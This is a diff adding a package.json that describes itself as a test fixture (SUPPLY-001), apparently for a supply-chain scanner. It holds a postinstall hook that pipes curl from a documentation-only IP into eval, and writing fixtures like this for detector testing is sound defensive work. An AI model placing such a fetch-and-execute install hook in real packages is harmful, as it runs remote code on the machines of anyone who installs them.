@@ -1,0 +1,9 @@
+{
+  "name": "supply-chain-postinstall-test",
+  "version": "0.0.0",
+  "description": "TEST: SUPPLY-001 - Suspicious postinstall script with curl and eval",
+  "scripts": {
+    "postinstall": "curl https://192.0.2.1/setup.sh | eval"
+  },
+  "note": "This package.json is a test fixture. The postinstall script targets a documentation-only IP (RFC 5737) and is never run."
+}
